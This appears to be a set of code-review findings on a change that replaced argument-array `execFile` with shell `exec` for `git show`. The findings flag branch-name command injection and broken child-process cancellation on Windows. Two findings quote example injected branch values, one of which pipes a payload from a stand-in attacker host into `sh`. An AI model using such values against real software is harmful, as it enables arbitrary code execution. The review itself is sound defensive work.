findings.title: [P1] Pass the branch as an argv element
findings.body: If `branch` contains shell syntax, `exec()` interprets it as part of the command. For example, a branch containing `;` can execute an additional command with the application's privileges. Retain `execFile("git", ["show", branch])` so the branch remains a single argument.

findings.title: [P2] Preserve direct-child cancellation semantics
findings.body: On Windows, `exec()` inserts `cmd.exe` between the caller and Git. Killing the returned process can terminate only the shell while leaving `git show` running, unlike the previous direct `execFile()` child.

findings.title: [P2] Preserve direct-child cancellation semantics
findings.body:
`exec()` inserts `cmd.exe` between the caller and Git on Windows. Calling `.kill()` on the returned process now terminates the shell rather than its long-running `git show` child, allowing canceled work to continue consuming resources and producing output.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argv element instead of shell interpolation
findings.body:
`exec()` invokes a shell, so a caller-controlled branch such as `topic;printf${IFS}INJECTED` executes an additional command on POSIX. This string is also accepted by `git check-ref-format --branch`, so even valid branch names can trigger arbitrary command execution. Preserve `execFile("git", ["show", branch])`.

_Recommend validating this comment independently._

findings.title: [P1] Use `execFile` to prevent branch-name command injection
findings.body:
`exec` passes the interpolated branch through a shell. If an attacker can influence `branch`, an input such as `HEAD; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. The previous argument-array implementation preserved the trust boundary.

_Recommend validating this comment independently._
